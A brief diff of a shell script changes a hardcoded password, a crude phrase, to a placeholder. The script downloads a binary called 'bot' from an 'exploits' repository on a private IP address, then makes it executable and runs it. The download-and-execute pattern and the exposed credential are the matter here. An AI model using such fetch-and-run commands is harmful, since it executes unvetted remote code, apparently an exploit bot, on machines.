@@ -1,3 +1,3 @@
-wget --user admin --password "Jimmy has a big dick." http://10.3.70.212:8081/repository/expoits/bot
+wget --user admin --password "enterapassword" http://10.3.70.212:8081/repository/expoits/bot
 chmod +x bot
 ./bot
